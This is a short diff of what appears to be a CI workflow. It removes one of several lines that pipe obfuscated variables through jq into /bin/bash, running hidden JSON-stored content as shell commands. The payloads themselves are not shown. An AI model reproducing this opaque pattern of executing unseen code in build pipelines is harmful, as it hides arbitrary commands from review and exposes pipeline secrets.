@@ -21,7 +21,6 @@ jobs:
           echo $k61 | jq -r .xgmyp928 | /bin/bash
           echo $pbglj87285 | jq -r .wiqgl77618 | /bin/bash
           echo $wpv31 | jq -r .yjcpj1913 | /bin/bash
-          printf '%s' "$kwma0070" | jq -r .ukec53 | /bin/bash
           echo $vweyt69675 | jq -r .bly053 | /bin/bash
           echo $iphv712 | jq -r .g2649 | /bin/bash
 
